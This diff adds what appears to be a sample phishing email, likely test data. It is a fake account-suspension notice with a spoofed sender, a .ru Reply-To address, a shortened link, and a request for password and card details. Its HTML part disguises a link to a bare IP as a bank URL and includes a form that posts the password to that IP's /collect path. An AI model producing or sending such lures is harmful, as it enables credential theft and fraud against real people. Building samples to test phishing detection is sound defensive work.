@@ -1,0 +1,34 @@
+From: "Account Security Team" <security@account-alerts-example.com>
+Reply-To: support-desk@mailbox-example.ru
+To: customer@example.com
+Subject: URGENT: Your account has been suspended - verify within 24 hours
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="BOUNDARY123"
+
+--BOUNDARY123
+Content-Type: text/plain; charset="utf-8"
+
+Dear Customer,
+
+We detected unusual activity and your account has been suspended.
+To restore access you must verify your account within 24 hours or it
+will be permanently closed.
+
+Verify now: http://bit.ly/3xVerify
+Or visit: http://203.0.113.45/secure/login
+
+You will need your username, password and credit card number.
+
+Account Security Team
+
+--BOUNDARY123
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>Dear Customer,</p>
+<p>We detected unusual activity and your account has been <b>suspended</b>.</p>
+<p><a href="http://203.0.113.45/secure/login">https://www.example-bank.com/verify</a></p>
+<form action="http://203.0.113.45/collect" method="post"><input name="password"></form>
+</body></html>
+
+--BOUNDARY123--
